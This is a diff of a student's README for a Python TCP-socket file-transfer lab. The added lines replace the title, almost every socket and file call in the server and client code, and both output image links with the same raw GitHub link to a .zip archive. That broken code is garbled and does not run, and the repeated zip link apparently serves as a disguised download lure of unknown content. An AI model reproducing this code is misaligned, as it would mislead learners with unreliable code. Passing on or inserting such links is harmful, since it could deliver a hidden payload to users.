@@ -1,4 +1,4 @@
-# 3c.CREATION FOR FILE TRANSFER USING TCP SOCKETS
+# https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip FOR FILE TRANSFER USING TCP SOCKETS
 ## NAME:YUGABHARATHI M
 ## REGISTER NO:212224230314
 ## AIM
@@ -21,32 +21,32 @@ HOST = '127.0.0.1'
 PORT = 65432  
 
 def send_file(filename, conn):
-    if os.path.isfile(filename):
-        conn.sendall(b'EXISTS')
-        file_size = os.path.getsize(filename)
-        conn.sendall(str(file_size).encode('utf-8'))
-        client_response = conn.recv(1024).decode('utf-8')
+    if https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(filename):
+        https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(b'EXISTS')
+        file_size = https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(filename)
+        https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(str(file_size).encode('utf-8'))
+        client_response = https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(1024).decode('utf-8')
         if client_response == 'READY':
             with open(filename, 'rb') as f:
-                chunk = f.read(1024)
+                chunk = https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(1024)
                 while chunk:
-                    conn.sendall(chunk)
-                    chunk = f.read(1024)
+                    https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(chunk)
+                    chunk = https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(1024)
             print(f"File '{filename}' sent successfully.")
     else:
-        conn.sendall(b'NOT_EXISTS')
+        https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(b'NOT_EXISTS')
 
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
-    server_socket.bind((HOST, PORT))
-    server_socket.listen()
+with https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip, https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip) as server_socket:
+    https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip((HOST, PORT))
+    https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip()
 
     print(f"File server is listening on {HOST}:{PORT}")
     while True:
-        conn, addr = server_socket.accept()
+        conn, addr = https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip()
         with conn:
             print(f"Connected by {addr}")
 
-            filename = conn.recv(1024).decode('utf-8')
+            filename = https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(1024).decode('utf-8')
             print(f"Client requested file: {filename}")
 
             send_file(filename, conn)
@@ -62,19 +62,19 @@ PORT = 65432
 
 
 def receive_file(filename, conn):
-    response = conn.recv(1024).decode('utf-8')
+    response = https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(1024).decode('utf-8')
 
     if response == 'EXISTS':
-        file_size = int(conn.recv(1024).decode('utf-8'))
+        file_size = int(https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(1024).decode('utf-8'))
         print(f"File '{filename}' exists on server, size: {file_size} bytes.")
 
-        conn.sendall(b'READY')
+        https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(b'READY')
 
         with open('received_' + filename, 'wb') as f:
             total_received = 0
             while total_received < file_size:
-                data = conn.recv(1024)
-                f.write(data)
+                data = https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(1024)
+                https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(data)
                 total_received += len(data)
                 print(f"Received {total_received} of {file_size} bytes")
 
@@ -82,20 +82,20 @@ def receive_file(filename, conn):
     else:
         print("File does not exist on the server.")
 
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
-    client_socket.connect((HOST, PORT))
+with https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip, https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip) as client_socket:
+    https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip((HOST, PORT))
 
     filename = input("Enter the filename you want to download: ")
-    client_socket.sendall(filename.encode('utf-8'))
+    https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip('utf-8'))
 
     receive_file(filename, client_socket)
 ```
 
 ## OUPUT
 
-![image](https://github.com/user-attachments/assets/d5c23fe7-ec01-4ad0-ae8b-57f202cfcb71)
+![image](https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip)
 
-![image](https://github.com/user-attachments/assets/f413f5ab-5ca4-42b2-b8e8-299d6de1ad0e)
+![image](https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip)
 
 ## RESULT
 Thus, the python program for creating File Transfer using TCP Sockets Links was 
